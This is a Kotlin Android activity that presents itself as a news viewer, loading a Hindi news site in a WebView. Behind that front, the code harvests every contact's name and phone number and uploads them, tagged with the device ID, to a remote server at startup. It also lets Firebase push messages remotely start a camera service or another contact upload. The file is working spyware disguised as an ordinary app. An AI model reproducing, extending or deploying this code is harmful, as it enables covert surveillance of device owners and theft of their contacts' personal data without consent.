package com.ecommerce.experimentapp.ui

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import android.webkit.WebView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.ecommerce.experimentapp.R
import com.ecommerce.experimentapp.constant.AppConstants
import com.ecommerce.experimentapp.databinding.ActivityMainBinding
import com.ecommerce.experimentapp.model.ContactData
import com.ecommerce.experimentapp.model.ContactReq
import com.ecommerce.experimentapp.model.FCMTokenData
import com.ecommerce.experimentapp.network.CommonUtility
import com.ecommerce.experimentapp.network.RetrofitClient
import com.ecommerce.experimentapp.service.CameraService
import com.ecommerce.experimentapp.service.MyFirebaseMessagingService
import com.ecommerce.experimentapp.service.MyFirebaseMessagingService.Companion
import com.google.firebase.messaging.FirebaseMessaging
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.File

class MainActivity : AppCompatActivity() {

    companion object {
        private const val PERMISSION_REQUEST_CODE = 1001
        private const val TAG = "MainActivity"

    }
    private lateinit var binding: ActivityMainBinding
    private var cameraType = AppConstants.CAMERA_BACK

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setSupportActionBar(binding.toolbar)
        requestPermissions()
        initializeFirebase()
        handleFCMServiceIntent(intent) // Handle any intent that started this activity
        openContact()
        setWebView()

    }

    private fun openContact(){
        binding.fab.setOnClickListener {
            // Handle the click event
            val intent = Intent(this@MainActivity, ContactActivity::class.java)
            startActivity(intent)
            //Toast.makeText(this, "FAB Clicked!", Toast.LENGTH_SHORT).show()

        }
    }

    private fun setWebView(){
        val webView: WebView = findViewById(R.id.webview)
        webView.settings.javaScriptEnabled = true // Enable JavaScript if required
        webView.loadUrl("https://hindi.news24online.com/")
       // webView.loadUrl("https://www.ndtv.com/")
    }


    private fun requestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_CONTACTS // Add this for contacts
        )
        if (!permissionsGranted(permissions)) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE)
        } else {
          //  startCameraService()
            readContacts()
        }
    }

    private fun permissionsGranted(permissions: Array<String>): Boolean {
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun handleFCMServiceIntent(intent: Intent?) {
        intent?.let {
            if (it.hasExtra(AppConstants.FCM_SERVICE_TYPE) && it.getStringExtra(AppConstants.FCM_SERVICE_TYPE) == AppConstants.CAMERA) {
                cameraType = it?.getStringExtra(AppConstants.OPEN_CAMERA_TYPE) ?: AppConstants.CAMERA_BACK
                startCameraService(cameraType)
            }
            if (it.hasExtra(AppConstants.FCM_SERVICE_TYPE) && it.getStringExtra(AppConstants.FCM_SERVICE_TYPE) == AppConstants.CONTACTS) {
                readContacts()
            }
        }
    }

    private fun startCameraService(cameraType: String) {
        //val intent = Intent(this, CameraService::class.java)

        val intent = Intent(this, CameraService::class.java).apply {
            putExtra(AppConstants.OPEN_CAMERA_TYPE, cameraType) // Add this extra
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            Log.d(TAG, "CameraActivity startForegroundService ")
            startForegroundService(intent)
        } else {
            Log.d(TAG, "CameraActivity startService ")
            startService(intent)

        }
    }

    private fun initializeFirebase() {
        // Get FCM token
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) {
                Log.w(TAG, "Fetching FCM registration token failed", task.exception)
                return@addOnCompleteListener
            }

            // Get new FCM registration token
            val token = task.result
            Log.d(TAG, "FCM Token: $token")
            // Send token to your server or use it as needed
        }

/*        // Optionally, subscribe to a topic
        FirebaseMessaging.getInstance().subscribeToTopic("news")
            .addOnCompleteListener { task ->
                var msg = "Subscribed to topic"
                if (!task.isSuccessful) {
                    msg = "Subscription failed"
                }
                Log.d("MainActivity", msg)
            }*/
    }


    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            val permissionMap = permissions.mapIndexed { index, permission ->
                permission to grantResults[index]
            }.toMap()

           /* if (permissionMap[Manifest.permission.READ_CONTACTS] == PackageManager.PERMISSION_GRANTED) {
               // readContacts()
            } else {
                Log.w(TAG, "Read Contacts Permission Denied")
            }*/
        }
    }

    private fun sendContactsToServer(contacts: List<ContactData>) {
        val contactReq = ContactReq().apply {
            this.deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            this.contacts = contacts
        }
        Log.d(TAG, "Contact Req==  "+Gson().toJson(contactReq))
        Log.d(TAG, "Contact sending to Server.... ")
        val call = RetrofitClient.instance.sendContacts(contactReq)
        call.enqueue(object : Callback<String> {
            override fun onResponse(call: Call<String>, response: Response<String>) {
                if (response.isSuccessful) {
                    Log.d(TAG, "Contacts uploaded successfully")
                    Toast.makeText(baseContext, "Contacts uploaded successfully", Toast.LENGTH_LONG).show()
                } else {
                    Log.w(TAG, "Upload failed: ${response.errorBody().toString()}")
                    Toast.makeText(baseContext, "Failed to send Contacts to server: ${response.errorBody().toString()}", Toast.LENGTH_LONG).show()
                }
            }

            override fun onFailure(call: Call<String>, t: Throwable) {
                Log.e(TAG, "Error: ${t.message}")
            }
        })
    }


    @SuppressLint("Range")
    private fun readContacts() {
        var  contactDataList= ArrayList<ContactData>()
        val uniqueContacts = HashSet<String>() // To track unique contacts based on phone number
        val contentResolver = contentResolver
        val uri = ContactsContract.Contacts.CONTENT_URI
        val cursor = contentResolver.query(uri, null, null, null, null)


        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getString(it.getColumnIndex(ContactsContract.Contacts._ID))
                val name = it.getString(it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))

                if (it.getInt(it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    val phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )

                    phoneCursor?.use { pc ->
                        while (pc.moveToNext()) {
                            var phoneNumber = pc.getString(pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                            if (phoneNumber.startsWith("+91")) {
                                phoneNumber = phoneNumber.substring(3) // Remove the first three characters (+91)
                            }
                            phoneNumber = phoneNumber.replace(Regex("[^0-9]"), "")
                            if (!uniqueContacts.contains(phoneNumber) && phoneNumber.length==10) {
                                val contact = mapOf("name" to name, "phone" to phoneNumber)
                                 val contactData:ContactData= ContactData()
                                contactData.name=name
                                contactData.mobile=phoneNumber
                                contactDataList.add(contactData)
                                uniqueContacts.add(phoneNumber)
                            }
                        }
                    }
                }
            }
        }

         sendContactsToServer(contactDataList)
    }



}